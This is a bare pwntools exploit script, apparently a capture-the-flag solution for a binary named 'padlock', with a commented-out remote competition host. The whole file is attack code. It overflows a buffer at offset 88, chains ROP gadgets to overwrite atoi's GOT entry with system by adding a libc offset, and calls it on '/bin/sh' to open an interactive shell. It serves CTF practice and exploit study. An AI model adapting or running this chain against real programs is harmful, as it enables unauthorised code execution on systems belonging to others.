from pwn import *

context.binary=elf=ELF("./padlock")

libc = ELF('./libc.so.6', checksec=False)
p=process(elf.path)
#p=remote("offsec.m0lecon.it",13587)
pop_rdi=elf.sym.pop_rdi_ret
pop_rsi=elf.sym.pop_rsi_ret
pop_rdx=elf.sym.pop_rdx_ret
add_what=elf.sym.add_what_where
ret=ROP(elf).find_gadget(['ret'])[0]
main=elf.sym.main
offset=88
diff=libc.symbols["system"]-libc.symbols["atoi"]
print(p.recv())
vault=elf.sym.vault
payload=flat(
    b'a'*(offset),
    p64(ret),
    p64(pop_rdi),p64(0),
    p64(pop_rsi),p64(vault),
    p64(pop_rdx),p64(8),
    p64(elf.sym.read),
    
    p64(pop_rsi),p64(diff),
    p64(pop_rdi),p64(elf.got['atoi']),
    p64(add_what),

    p64(pop_rdi),p64(vault),
    p64(pop_rsi),p64(0),
    p64(pop_rdx),p64(0),
    p64(elf.plt["atoi"]),

)

p.sendline(payload)
print(p.recv())
p.send(b"/bin/sh\x00")
p.interactive()
